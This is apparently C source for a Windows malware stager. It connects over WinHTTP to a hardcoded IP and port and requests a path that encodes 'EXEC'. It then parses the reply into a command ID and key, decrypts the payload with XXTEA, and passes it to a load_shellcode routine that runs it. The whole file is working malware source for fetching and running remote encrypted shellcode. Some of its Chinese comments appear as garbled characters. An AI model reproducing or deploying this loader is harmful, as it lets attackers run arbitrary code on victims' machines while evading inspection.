#include "head.h"


#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

int main() 
{
    int cnt;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    WCHAR* argc_ip = L"192.168.127.129";
    int argc_port = 8080;
    WCHAR* argc_method = L"GET";
    WCHAR* argc_path = L"RVhFQw?name=app.bin";

    // Use WinHttpOpen to obtain a session handle.
    // ��ʼ��һ������
        hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    // ���ض���Դ�� HTTP ����,�ڵ���ʱ���Ὣ�����͵���������
    if (hSession)
        hConnect = WinHttpConnect(hSession, argc_ip, argc_port, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, 
            argc_method,
            argc_path,
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
    {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        cnt = 0;
        do
        {
            // Check for available data.
            //Ӧ�ó������ʹ�� HINTERNET ����ϵ� WinHttpReadData �� WinHttpQueryDataAvailable �������ط���������Դ��
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                printf("Error %u in WinHttpQueryDataAvailable.\n",GetLastError());
            }

            // Allocate space for the buffer.
            pszOutBuffer = malloc(dwSize + 1);
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {
                    enum operateID cmdID;
                    
                    char k16[16];
                    char* data;
                    int dataLen;

                    cmdID = *(int*)pszOutBuffer;
                    memcpy(k16, pszOutBuffer + 4, 16);
                    dataLen = dwSize - 4 - 16;
                    data = malloc(dataLen);
                    if (data == NULL) {
                        goto tag;
                    }
                    memcpy(data, pszOutBuffer + 4 + 16, dataLen);
                    xxtea(data, k16, dataLen , 1);
                    if (data[dataLen - 1] == 8) {
                        dataLen -= 8;
                    }
                    else {
                        dataLen -= data[dataLen - 1];
                    }
                    switch (cmdID)
                    {
                    case EXEC:
                        load_shellcode(data, dataLen);
                        free(data);
                        break;
                    default:
                        break;
                    }
                }

                // Free the memory allocated to the buffer.
                free(pszOutBuffer);
            }
        } while (dwSize > 0);
    }

tag:

    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) 
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession) 
        WinHttpCloseHandle(hSession);
}
